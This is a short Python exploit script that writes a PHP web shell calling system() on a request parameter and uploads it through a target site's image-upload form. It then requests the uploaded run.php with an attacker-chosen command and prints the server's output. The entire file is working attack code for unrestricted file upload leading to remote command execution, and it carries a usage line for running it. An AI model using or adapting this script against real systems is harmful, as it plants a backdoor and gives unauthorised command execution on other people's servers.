import requests
import sys

if len(sys.argv) != 3:
    print(f"[-] Usage:\n\t{sys.argv[0]} <URL> <COMMAND>")
    sys.exit()

url = sys.argv[1]
command = sys.argv[2]

payload = """<?php
system($_GET["cmd"]);
?>
"""

with open('run.php', 'w') as file:
    file.write(payload)

file = {'image': open('run.php', 'rb')}

upload_file = requests.post(url, files=file)

if "run.php" in upload_file.text:
    run_command = requests.get(url + f'/upload/run.php?cmd={command}')
    if run_command.status_code == 200:
        print(run_command.text)

